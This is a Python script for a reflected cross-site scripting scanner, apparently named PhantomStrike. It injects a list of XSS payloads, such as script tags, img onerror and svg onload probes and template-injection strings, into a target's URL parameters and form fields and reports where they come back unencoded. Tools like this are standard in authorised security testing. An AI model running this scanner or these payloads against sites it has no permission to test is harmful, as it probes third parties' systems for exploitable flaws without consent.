#!/usr/bin/env python3
"""Test for reflected XSS in URL parameters and forms."""
import argparse
import re
import sys
from html.parser import HTMLParser
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<svg/onload=alert(1)>',
    "{{7*7}}",
    "${7*7}",
    '"><svg/onload=alert(1)>',
]

CANARY = "PhAnToMxSs"


class FormParser(HTMLParser):
    """Extract forms and their inputs from HTML."""
    def __init__(self):
        super().__init__()
        self.forms = []
        self._current = None

    def handle_starttag(self, tag, attrs):
        attrs_d = dict(attrs)
        if tag == "form":
            self._current = {"action": attrs_d.get("action", ""), "method": attrs_d.get("method", "get").lower(), "inputs": []}
        elif tag == "input" and self._current is not None:
            self._current["inputs"].append({"name": attrs_d.get("name", ""), "type": attrs_d.get("type", "text"), "value": attrs_d.get("value", "")})

    def handle_endtag(self, tag):
        if tag == "form" and self._current is not None:
            self.forms.append(self._current)
            self._current = None


def detect_context(html, payload):
    """Detect the reflection context of a payload."""
    idx = html.find(payload)
    if idx == -1:
        return None
    before = html[max(0, idx - 50):idx]
    after = html[idx + len(payload):idx + len(payload) + 50]
    if re.search(r'<script[^>]*>', before, re.I) or '<script' in before.lower():
        return "javascript"
    if re.search(r'["\']$', before.rstrip()):
        return "attribute"
    if re.search(r'<!--', before) and '-->' not in before[before.rfind('<!--'):]:
        return "html_comment"
    return "html_body"


def test_param(session, url, param, value, timeout):
    """Test a single parameter for XSS reflection."""
    results = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    # First test with canary to see if reflection occurs
    test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
    test_params[param] = CANARY
    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"

    try:
        resp = session.get(test_url, timeout=timeout, verify=False, allow_redirects=True)
        if CANARY not in resp.text:
            return results
    except Exception:
        return results

    for payload in XSS_PAYLOADS:
        test_params[param] = payload
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
        try:
            resp = session.get(test_url, timeout=timeout, verify=False, allow_redirects=True)
            body = resp.text
            if payload in body:
                ctx = detect_context(body, payload)
                encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
                partially_encoded = encoded in body
                results.append({
                    "param": param,
                    "payload": payload,
                    "reflected": True,
                    "context": ctx or "unknown",
                    "encoded": partially_encoded and payload not in body,
                    "status": resp.status_code,
                })
        except Exception:
            continue
    return results


def test_forms(session, url, timeout):
    """Find and test forms on the page."""
    results = []
    try:
        resp = session.get(url, timeout=timeout, verify=False, allow_redirects=True)
    except Exception as e:
        print(f"  [!] Failed to fetch page: {e}", file=sys.stderr)
        return results

    parser = FormParser()
    try:
        parser.feed(resp.text)
    except Exception:
        return results

    for form in parser.forms:
        action = urljoin(url, form["action"]) if form["action"] else url
        for inp in form["inputs"]:
            if not inp["name"] or inp["type"] in ("submit", "button", "hidden", "checkbox", "radio"):
                continue
            for payload in XSS_PAYLOADS[:5]:
                data = {i["name"]: i["value"] or "test" for i in form["inputs"] if i["name"]}
                data[inp["name"]] = payload
                try:
                    if form["method"] == "post":
                        r = session.post(action, data=data, timeout=timeout, verify=False, allow_redirects=True)
                    else:
                        r = session.get(action, params=data, timeout=timeout, verify=False, allow_redirects=True)
                    if payload in r.text:
                        ctx = detect_context(r.text, payload)
                        results.append({
                            "type": "form",
                            "action": action,
                            "method": form["method"],
                            "param": inp["name"],
                            "payload": payload,
                            "reflected": True,
                            "context": ctx or "unknown",
                            "status": r.status_code,
                        })
                except Exception:
                    continue
    return results


def main():
    parser = argparse.ArgumentParser(description="Reflected XSS scanner")
    parser.add_argument("target", help="Target URL with parameters (e.g., http://example.com/page?q=test)")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--forms", action="store_true", help="Also test HTML forms on the page")
    args = parser.parse_args()

    target = args.target
    if not target.startswith("http"):
        target = f"https://{target}"

    session = requests.Session()
    session.headers["User-Agent"] = "PhantomStrike/1.0 XSS-Scanner"

    parsed = urlparse(target)
    params = parse_qs(parsed.query, keep_blank_values=True)

    print(f"[*] XSS Scanner - Target: {target}")
    print(f"[*] Payloads: {len(XSS_PAYLOADS)}")
    print(f"[*] Parameters found in URL: {list(params.keys()) if params else 'none'}")
    print()

    all_findings = []

    if params:
        print("=== URL Parameter Testing ===\n")
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            findings = test_param(session, target, param, params[param], args.timeout)
            for f in findings:
                severity = "HIGH" if f["context"] in ("html_body", "javascript") else "MEDIUM"
                print(f"    [{severity}] Reflected XSS in '{f['param']}'")
                print(f"           Payload: {f['payload']}")
                print(f"           Context: {f['context']}")
                print(f"           Status: {f['status']}")
                f["severity"] = severity
            all_findings.extend(findings)
            if not findings:
                print(f"    [OK] No reflection detected")
            print()
    else:
        print("[*] No URL parameters found. Use --forms to test HTML forms.")
        print("[*] Tip: provide URL with parameters, e.g., http://target.com/search?q=test\n")

    if args.forms:
        print("=== Form Testing ===\n")
        form_findings = test_forms(session, target, args.timeout)
        for f in form_findings:
            severity = "HIGH" if f["context"] in ("html_body", "javascript") else "MEDIUM"
            print(f"  [{severity}] Reflected XSS in form input '{f['param']}'")
            print(f"         Action: {f['action']} ({f['method'].upper()})")
            print(f"         Payload: {f['payload']}")
            print(f"         Context: {f['context']}")
            f["severity"] = severity
        all_findings.extend(form_findings)
        if not form_findings:
            print("  [OK] No XSS found in forms")
        print()

    print(f"{'='*50}")
    vuln_count = len(all_findings)
    high = sum(1 for f in all_findings if f.get("severity") == "HIGH")
    medium = sum(1 for f in all_findings if f.get("severity") == "MEDIUM")
    print(f"[*] Scan complete: {vuln_count} reflection(s) found")
    print(f"[*] Severity: {high} HIGH, {medium} MEDIUM")
    if vuln_count > 0:
        print(f"[!] WARNING: Reflected content detected - manual verification required")


if __name__ == "__main__":
    main()
